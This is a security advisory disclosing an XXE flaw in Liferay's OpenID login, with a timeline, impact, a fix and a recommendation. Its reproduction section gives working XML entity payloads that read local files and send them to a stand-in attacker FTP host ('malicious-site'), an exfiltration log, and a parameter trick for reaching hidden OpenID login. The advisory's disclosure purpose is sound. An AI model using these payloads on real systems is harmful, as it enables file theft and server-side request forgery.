# XML External Entity XXE vulnerability in OpenID component of Liferay

- Author: Sandro Gauci <sandro@enablesecurity.com>
- Vulnerable version: Liferay 6.2.3 CE GA4 and earlier
- Liferay reference: LPS-58014
- Advisory URL: <https://github.com/EnableSecurity/advisories/tree/master/ES2016-01-liferay-xxe>
- Timeline:
	- Report date: March 16 2015
	- Liferay patch: August 26 2015
	- Liferay advisory: January 18 2016
	- Enable Security advisory: June 1 2016

## Description

Liferay supports OpenID login which was found to make use of a version
of `openid4java` that is vulnerable to XML External Entity (XXE)
attacks.

## Impact

Abuse of the XXE vulnerability can (at least) lead to local file
disclosure, server-side request forgery (SSRF) and denial of service.
This vulnerability was abused to read local files on the web server
that the web application had access to.

## How to reproduce the issue

This issue was previously discovered to affect  [one of Google's web
server](https://code.google.com/p/chromium/issues/detail?id=240139)
which was using the same OpenID library.

To abuse this vulnerability, an attacker needs to:

1. Force Liferay to make use of OpenID for authentication
2. Provide an attacker-controlled URL (web location) as the OpenID URL. This URL should contain malicious XML (see below)
3. Upon reading the XML, the OpenID library will attempt to load the external entity on the attacker's web server
4. This external entity instructs the library to read a file from local disk and make use of it's contents to load another file from an attacker controlled (custom) FTP server

Thus the contents of the file to be read are sent to the custom FTP
server. During exploitation, we had to make use of a fake FTP server
(from <https://github.com/ONsec-Lab/scripts>) to receive the
information. However, it might be possible to use HTTP and other
protocols too depending on the version of Java used and other
variables.

For step 1, the attacker needs to locate the authentication form in
Liferay and then click on the OpenID link. The attacker then specifies <http://malicious-site> as an OpenID URL. This website would contain the following:

```html
<meta http-equiv="X-XRDS-Location" 
	content="http://malicious-site/yadis.xml"> 
```

As the OpenID library reads that, it loads `yadis.xml` which would contain the
following:

```xml
<?xml version="1.0"?>
	<!DOCTYPE a [
	   <!ENTITY % asd SYSTEM "http://malicious-site/xxe.xml"> 
	   %asd; 
	   %rrr; 
	]>
<a></a>
```

This loads `xxe.xml` which in turn would contain the following:

	<!ENTITY % b SYSTEM "file:///">
	<!ENTITY % c "<!ENTITY &#37; rrr SYSTEM 'ftp://malicious-site:443/%b;'>">
	%c;

Once the XML interpreter parses these contents, it connects to the FTP
site, sending the contents of the root directory on the server as can
be seen in the following log:

	> sudo ruby xxe-ftp-server.rb
	FTP. New client connected
	< USER anonymous
	< PASS Java1.6.0_21@
	> 230 more data please!
	< TYPE I
	> 230 more data please!
	< EPSV ALL
	> 230 more data please!
	< EPSV
	> 230 more data please!
	< EPRT |1|172.x.x.x|39051|
	> 230 more data please!
	< bin
	> 230 more data please!
	< boot
	> 230 more data please!
	< dev
	> 230 more data please!
	< etc
	> 230 more data please!
	< home
	> 230 more data please!
	... etc

Directories and also local files could be read using this method.

Note that sometimes the OpenID login method is hidden but the functionality is not disabled from within Liferay itself. In such cases, it is possible to force Liferay to make use of OpenID anyway by setting the `_58_struts_action` parameter from `/login/login` to `/login/open_id`. 

## Solutions and recommendations

Upgrading to the latest version of Liferay should address this
security vulnerability. The patch was published at the following location: <https://sourceforge.net/projects/liferay-patches/files/6.2.3%20GA4/>

Additionally, to address this issue it is recommended to disable
OpenID support.

## Further reading

- <http://openid.net/2011/05/05/attribute-exchange-security-alert/>
- <https://code.google.com/p/chromium/issues/detail?id=240139>
